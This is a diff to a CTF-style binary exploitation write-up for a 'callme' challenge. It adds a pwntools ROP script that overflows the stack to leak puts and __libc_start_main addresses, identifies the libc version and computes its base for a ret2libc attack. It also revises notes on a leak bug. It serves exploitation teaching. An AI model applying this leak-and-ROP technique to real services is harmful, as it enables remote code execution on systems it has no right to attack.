@@ -49,6 +49,75 @@ memory.
 libc.address = leaked_addr - libc.symbols["puts"]
 ```
 
+<details>
+<summary>What `libc` version am I using?</summary>
+
+If we run the program locally, we can use something like `readelf -d callme`
+to find what is being loaded:
+
+```
+Dynamic section at offset 0xe00 contains 26 entries:
+  Tag        Type                         Name/Value
+ 0x0000000000000001 (NEEDED)             Shared library: [libcallme.so]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+```
+
+`libc.so.6` which is found under `/lib/x86_64-linux-gnu/libc.so.6`.
+
+However, assuming that this is a program running on a remote machine, we don't
+have it quite so easy.
+
+We can leak one (or for better accuracy multiple) addresses of libc functions
+and use tools like [blukat libc database search](https://libc.blukat.me/) or
+[niklasb libc database](https://github.com/niklasb/libc-database) to determine
+the correct version.
+
+![Providing the libc database search with the address at which we found puts
+returns 4 matches, only one of them being x86\_64.](libc-database-search.png)
+
+![Providing the address of __libc_start_main also, we narrowed the search down
+to one match.](libc-version-2.png)
+
+To do the leaking, we can use a function like this:
+
+```python
+process_name = "./callme"
+elf = ELF(process_name)
+rop = ROP(elf)
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+OFFSET = b'A'*40
+PUTS_PLT = elf.plt['puts']                         # so that we can call the puts function
+MAIN = elf.sym['main']                             # so that we can call main again, after leaking an address
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+RET = (rop.find_gadget(['ret']))[0]                # additional ret instruction for padding, to realign stack
+
+def find_addr(func_name):
+    func_got = elf.got[func_name]
+    # overflow stack, print out function's address, restart at main
+    payload = OFFSET + p64(POP_RDI) + p64(func_got) + p64(PUTS_PLT) + p64(MAIN)
+    print(p.recvuntil("> "))
+    print(p.clean())
+    p.sendline(payload)
+    leaked_string = p.recvuntil("\ncallme")
+    received = leaked_string.replace(b"Thank you!\n", b"")
+    received = received.replace(b"\ncallme", b"")
+    leaked_addr = u64(received.ljust(8, b"\x00"))
+    print("--- leak BEGIN ---")
+    print(hex(leaked_addr))
+    print("--- leak END ---")
+    if libc.address == 0:
+        libc.address = leaked_addr - libc.symbols[func_name]
+        print("libc base @ %s" % hex(libc.address))
+
+find_addr('puts')
+find_addr('__libc_start_main')
+```
+
+</details>
+
+---
+
 Finally, we can do our search for the `/bin/sh` string and the `system()`
 function.
 
@@ -130,16 +199,15 @@ p.interactive()
 ```
 
 I created most of this with some help from this great
-[blog](https://pollevanhoof.be/nuggets/buffer_overflow_linux/3_aslr_ret2libc).
+[blog](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address).
 
-Note that in the linked article it is mentioned:
+Using the script as displayed in the linked article I was always missing the
+last byte of the leaked address.
+GDB per default disables ASLR, meaning that every time I ran the program in the
+debugger, the leaked address was the same.
+This address just so happened to end in a `0x20`.
 
-> We can now run our script inside a small bash loop and after a couple of
-> crashes it should pop us a shell:
-> `while ! ./exploit_ret2libc.py; do clear; done`
-
-The reason why the program crashes sometimes instead of spawning a shell
-seems to be caused by this line:
+The culprit is this line:
 
 ```python
 recieved = leaked_string.replace(b"overflow me:", b"").strip()
